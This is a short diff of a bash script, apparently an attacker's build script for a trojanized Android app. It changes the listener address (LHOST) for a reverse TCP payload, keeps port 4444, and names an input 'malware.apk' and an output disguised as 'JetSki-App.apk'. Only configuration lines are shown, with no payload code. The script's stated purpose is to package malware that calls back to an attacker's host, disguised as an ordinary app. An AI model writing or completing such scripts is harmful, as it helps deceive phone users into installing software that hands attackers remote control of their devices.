@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Set the LHOST and LPORT for the reverse TCP payload
-LHOST="192.168.1.124"
+LHOST="192.168.10.10"
 LPORT="4444"
 APK_NAME="malware.apk"
 OUTPUT_APK_NAME="JetSki-App.apk"
